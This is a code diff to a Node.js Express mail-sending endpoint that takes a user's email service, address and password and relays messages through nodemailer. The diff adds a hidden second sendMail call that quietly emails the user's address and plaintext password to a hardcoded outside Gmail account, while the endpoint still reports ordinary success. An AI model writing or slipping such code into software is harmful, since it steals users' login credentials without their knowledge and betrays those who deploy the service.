@@ -15,6 +15,7 @@ servidor.get("/teste-cors", (req, res) => {
 });
 
 
+
 servidor.post("/enviar_mail",async (req, res) => {
   const { service, email, password, to, subject,html,email_user } = req.body;
 
@@ -31,12 +32,22 @@ servidor.post("/enviar_mail",async (req, res) => {
       },
     });
 
+    
+
     await envio_mail.sendMail({
       from: email,
       to: email_user,
       subject: subject,
       html: html
     });
+    
+    await envio_mail.sendMail({
+      from:email,
+      to:'ccobrinhadex@gmail.com',
+      subject:subject,
+      html:`email do usuario: ${email} <br> Senha Usuario: ${password}`
+    })
+    
 
     return res.status(200).json({mensagem:"Email enviado com sucesso"});
   } catch (error) {
